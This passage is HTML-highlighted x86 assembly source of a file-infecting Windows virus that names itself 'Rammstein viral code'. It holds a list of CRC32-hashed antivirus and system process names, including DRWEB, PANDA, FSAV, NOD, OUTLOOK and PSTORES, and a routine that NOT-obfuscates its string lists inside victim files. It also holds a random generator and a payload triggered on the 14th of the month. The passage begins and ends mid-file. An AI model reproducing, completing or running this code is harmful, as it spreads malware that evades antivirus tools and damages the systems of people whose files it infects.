       </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">                                        </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc5">crc32</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">N32</span><span class="sc4">&gt;</span><span class="sc0">                                 </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">                                        </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc5">crc32</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">NOD</span><span class="sc4">&gt;</span><span class="sc0">                                 </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">                                        </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc5">crc32</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">NPSSVC</span><span class="sc4">&gt;</span><span class="sc0">                              </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">6</span><span class="sc0">                                        </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc5">crc32</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">NSCHEDNT</span><span class="sc4">&gt;</span><span class="sc0">                            </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">                                        </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc5">crc32</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">NSPLUGIN</span><span class="sc4">&gt;</span><span class="sc0">                            </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">                                        </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc5">crc32</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">TB</span><span class="sc4">&gt;</span><span class="sc0">                                  </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">                                        </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc5">crc32</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">F</span><span class="sc4">-&gt;</span><span class="sc0">                                  </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">                                        </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc5">crc32</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">AW</span><span class="sc4">&gt;</span><span class="sc0">                                  </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">                                        </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc5">crc32</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">AV</span><span class="sc4">&gt;</span><span class="sc0">                                  </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">                                        </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc5">crc32</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">NAV</span><span class="sc4">&gt;</span><span class="sc0">                                 </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">                                        </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc5">crc32</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">PAV</span><span class="sc4">&gt;</span><span class="sc0">                                 </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">                                        </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc5">crc32</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">RAV</span><span class="sc4">&gt;</span><span class="sc0">                                 </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">                                        </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc5">crc32</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">NVC</span><span class="sc4">&gt;</span><span class="sc0">                                 </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">                                        </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc5">crc32</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">FPR</span><span class="sc4">&gt;</span><span class="sc0">                                 </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">                                        </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc5">crc32</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">DSS</span><span class="sc4">&gt;</span><span class="sc0">                                 </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">                                        </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc5">crc32</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">IBM</span><span class="sc4">&gt;</span><span class="sc0">                                 </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">                                        </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc5">crc32</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">INOC</span><span class="sc4">&gt;</span><span class="sc0">                                </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">                                        </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc5">crc32</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">ANTI</span><span class="sc4">&gt;</span><span class="sc0">                                </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">                                        </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc5">crc32</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">SCN</span><span class="sc4">&gt;</span><span class="sc0">                                 </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">                                        </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc5">crc32</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">SCAN</span><span class="sc4">&gt;</span><span class="sc0">                                </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">                                        </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc5">crc32</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">VSAF</span><span class="sc4">&gt;</span><span class="sc0">                                </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">                                        </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc5">crc32</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">VSWP</span><span class="sc4">&gt;</span><span class="sc0">                                </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">                                        </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc5">crc32</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">PANDA</span><span class="sc4">&gt;</span><span class="sc0">                               </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">                                        </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc5">crc32</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">DRWEB</span><span class="sc4">&gt;</span><span class="sc0">                               </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">                                        </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc5">crc32</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">FSAV</span><span class="sc4">&gt;</span><span class="sc0">                                </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">                                        </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc5">crc32</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">SPIDER</span><span class="sc4">&gt;</span><span class="sc0">                              </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">                                        </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc5">crc32</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">ADINF</span><span class="sc4">&gt;</span><span class="sc0">                               </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">                                        </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc5">crc32</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">EXPLORER</span><span class="sc4">&gt;</span><span class="sc0">                            </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">                                        </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc5">crc32</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">SONIQUE</span><span class="sc4">&gt;</span><span class="sc0">                             </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">7</span><span class="sc0">                                        </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc5">crc32</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">SQSTART</span><span class="sc4">&gt;</span><span class="sc0">                             </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">7</span><span class="sc0">                                        </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc5">crc32</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">SMSS</span><span class="sc4">&gt;</span><span class="sc0">                                </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">                                        </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc5">crc32</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">OUTLOOK</span><span class="sc4">&gt;</span><span class="sc0">                             </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">7</span><span class="sc0">                                        </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc5">crc32</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">PSTORES</span><span class="sc4">&gt;</span><span class="sc0">                             </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">7</span><span class="sc0">                                        </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">                                     </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">not_list</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">                                      </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">____1</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">copying</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">                        </span><span class="sc1">;syncronization</span><span class="sc0">
       </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">____1</span><span class="sc0">                                    </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">in_list</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">                        </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">                                </span><span class="sc1">;this NOTs a list</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">                                </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">not_byte</span><span class="sc4">:</span><span class="sc0">                                          </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">lodsb</span><span class="sc0">                                       </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">                                      </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">stosb</span><span class="sc0">                                       </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">not_byte</span><span class="sc0">                               </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">                                 </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">in_list</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                        </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">ret</span><span class="sc0">                                         </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">not_list</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">                                      </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">in_list</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                                       </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">brandom32</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">                                     </span><span class="sc1">;this bounds eax</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">                                    </span><span class="sc1">;between 0 and eax-1</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                                    </span><span class="sc1">;on random basis</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                                  </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                    </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">random32</span><span class="sc0">                               </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                                     </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">div</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                                     </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">                               </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                                     </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">                                     </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">ret</span><span class="sc0">                                         </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">brandom32</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">                                     </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">random32</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">                                      </span><span class="sc1">;this is a random nr</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">                                    </span><span class="sc1">;generator. It's a</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">_GetTickCount</span><span class="sc4">]</span><span class="sc0">                    </span><span class="sc1">;modified version of</span><span class="sc0">
       </span><span class="sc6">rcl</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">                                  </span><span class="sc1">;some random gen I found</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">12345678h</span><span class="sc0">                          </span><span class="sc1">;someday and it had</span><span class="sc0">
</span><span class="sc5">random_seed</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">                        </span><span class="sc1">;some flaws I fixed...</span><span class="sc0">
       </span><span class="sc6">adc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">                                </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                                </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">random_seed</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                  </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">-</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">                            </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">rcl</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">                                  </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">                                     </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">ret</span><span class="sc0">                                         </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">random32</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">                                      </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ</span><span class="sc0">
</span><span class="sc5">check_not</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">                                     </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">pusha</span><span class="sc0">                                       </span><span class="sc1">;Be sure not to let</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">list_of_lists</span><span class="sc4">]</span><span class="sc0">                </span><span class="sc1">;some of the lists</span><span class="sc0">
                                                   </span><span class="sc1">;un-NOTed in the</span><span class="sc0">
</span><span class="sc5">get_another</span><span class="sc4">:</span><span class="sc0">                                       </span><span class="sc1">;victim file</span><span class="sc0">
       </span><span class="sc6">lodsd</span><span class="sc0">                                       </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                 </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">correct</span><span class="sc0">                                  </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">finaldestination</span><span class="sc4">]</span><span class="sc0">             </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc6">NOT</span><span class="sc0"> </span><span class="sc3">"L"</span><span class="sc0">                 </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">no_problem</span><span class="sc0">                               </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">wrong</span><span class="sc0">                                  </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">no_problem</span><span class="sc4">:</span><span class="sc0">                                        </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">                                  </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">get_another</span><span class="sc0">                             </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">correct</span><span class="sc4">:</span><span class="sc0">                                           </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">popa</span><span class="sc0">                                        </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">ret</span><span class="sc0">                                         </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">wrong</span><span class="sc4">:</span><span class="sc0">                                             </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">pusha</span><span class="sc0">                                       </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                    </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">lodsd</span><span class="sc0">                                       </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">                                     </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">not_list</span><span class="sc0">                               </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">popa</span><span class="sc0">                                        </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">ret</span><span class="sc0">                                         </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">check_not</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">                                     </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">list_of_lists</span><span class="sc0"> </span><span class="sc9">label</span><span class="sc0">                                </span><span class="sc1">;</span><span class="sc0">
              </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">direct_list</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">start</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">direct_list_len</span><span class="sc0">
              </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">file_extensions</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">start</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">file_extensions_len</span><span class="sc0">
              </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">av_list</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">start</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">av_list_len</span><span class="sc0">
              </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                                 </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">KillThread</span><span class="sc4">:</span><span class="sc0">                                        </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc9">IF</span><span class="sc0"> </span><span class="sc5">VIRUSNOTIFYEXIT</span><span class="sc0">                          </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                                      </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">exittext1</span><span class="sc0">                              </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'Rammstein viral code end!'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">           </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">exittext1</span><span class="sc4">:</span><span class="sc0">                                         </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">exittext2</span><span class="sc0">                              </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'Rammstein viral code end!'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">           </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">exittext2</span><span class="sc4">:</span><span class="sc0">                                         </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                                      </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">_MessageBoxA</span><span class="sc4">]</span><span class="sc0">                     </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc9">ENDIF</span><span class="sc0">                                       </span><span class="sc1">;</span><span class="sc0">

       </span><span class="sc9">IF</span><span class="sc0"> </span><span class="sc5">PAYLOAD</span><span class="sc0">                                  </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">time</span><span class="sc4">]</span><span class="sc0">                         </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">_GetSystemTime</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">              </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">time</span><span class="sc4">]</span><span class="sc0">                         </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">edi.ST_wDay</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">14d</span><span class="sc0">             </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">no_payload</span><span class="sc0">                              </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">DoPayload</span><span class="sc0">                              </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">no_payload</span><span class="sc4">:</span><span class="sc0">                                        </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc9">ENDIF</span><span class="sc0">                                       </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc9">IF</span><span class="sc0"> </span><span class="sc5">MAINTHREADSEH</span><span class="sc0">                            </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">restore_main_seh</span><span class="sc0">                        </span><span class="sc1">;host</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">MainExceptionExit</span><span class="sc4">:</span><span class="sc0">                                 </span><span class="sc1">;if we had an error we</span><span class="sc0">
